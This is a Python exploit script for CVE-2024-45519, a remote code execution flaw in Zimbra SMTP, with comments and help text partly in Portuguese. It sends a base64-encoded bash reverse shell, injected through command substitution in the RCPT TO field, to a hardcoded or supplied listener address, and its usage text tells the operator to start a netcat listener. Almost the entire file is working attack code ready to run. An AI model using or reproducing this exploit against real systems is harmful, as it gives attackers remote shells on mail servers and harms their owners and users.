import socket
import base64
import argparse

def is_port_open(host, port, timeout=10):
    """
    Check if a specific port on a host is open.
    """
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False

def smtp_send_command(connection, command):
    """
    Send a command to the SMTP server and return its response.
    """
    connection.send(command)
    return connection.recv(1024).decode('utf-8')

def smtp_exploit_reverse_shell(host, port, local_ip, local_port, timeout=10):
    """
    Exploit SMTP server with reverse shell payload.
    """
    # Reverse shell payload usando base64 para evitar problemas de caracteres especiais
    reverse_shell = f"/bin/bash -i 5<> /dev/tcp/{local_ip}/{local_port} 0<&5 1>&5 2>&5"
    base64_revshell = base64.b64encode(reverse_shell.encode()).decode()
    payload = f"echo${{IFS}}{base64_revshell}|base64${{IFS}}-d|bash"
    
    try:
        with socket.create_connection((host, port), timeout=timeout) as conn:
            print(f"[*] Connected to {host}:{port}")
            
            # SMTP handshake
            response = smtp_send_command(conn, b'EHLO localhost\r\n')
            print(f"[*] EHLO Response: {response.strip()}")
            
            response = smtp_send_command(conn, b'MAIL FROM: <exploit@mail.domain.com>\r\n')
            print(f"[*] MAIL FROM Response: {response.strip()}")
            
            # Payload no RCPT TO
            rcpt_to_payload = f'RCPT TO: <"aabbb$({payload})"@mail.domain.com>\r\n'.encode()
            response = smtp_send_command(conn, rcpt_to_payload)
            print(f"[*] RCPT TO Response: {response.strip()}")
            
            # Finalizar transação
            response = smtp_send_command(conn, b'DATA\r\n')
            print(f"[*] DATA Response: {response.strip()}")
            
            response = smtp_send_command(conn, b'Exploit payload sent\r\n.\r\n')
            print(f"[*] Message Response: {response.strip()}")
            
            response = smtp_send_command(conn, b'QUIT\r\n')
            print(f"[*] QUIT Response: {response.strip()}")
            
            print(f"[+] Exploit completed! Check your netcat listener on port {local_port}")
            return True
            
    except Exception as e:
        print(f"[!] Error during exploitation: {str(e)}")
        return False

def main():
    # Configuração do parser de argumentos
    parser = argparse.ArgumentParser(
        description="CVE-2024-45519 - Zimbra SMTP RCE Exploit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemplo de uso:
  python3 exploit.py localhost
  python3 exploit.py 192.168.1.100 -p 25 -lh 10.0.0.5 -lp 4444
  
IMPORTANTE: Execute o listener em outro terminal antes de rodar o exploit:
  Terminal 1: nc -lvnp 4444
  Terminal 2: python3 exploit.py localhost
        """
    )
    
    parser.add_argument("target", help="IP do servidor Zimbra alvo")
    parser.add_argument("-p", "--port", type=int, default=25, help="Porta SMTP (default: 25)")
    parser.add_argument("-lh", "--lhost", default="172.27.149.248", help="Seu IP externo para o listener (default: 172.27.149.248)")
    parser.add_argument("-lp", "--lport", type=int, default=4444, help="Porta do listener (default: 4444)")
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("CVE-2024-45519 - Zimbra SMTP RCE Exploit")
    print("=" * 60)
    print(f"[*] Target: {args.target}:{args.port}")
    print(f"[*] Your IP: {args.lhost}")
    print(f"[*] Listener Port: {args.lport}")
    print("=" * 60)
    
    # Verificar se a porta está aberta
    if is_port_open(args.target, args.port):
        print(f"[+] Port {args.port} is open on {args.target}")
        print("[*] Starting exploitation...")
        
        # Executar exploit
        if smtp_exploit_reverse_shell(args.target, args.port, args.lhost, args.lport):
            print("[+] Exploit executed successfully!")
        else:
            print("[!] Exploitation failed")
    else:
        print(f"[!] Port {args.port} is closed on {args.target}")
        print("[!] Make sure the Zimbra SMTP service is running")

if __name__ == "__main__":
    main()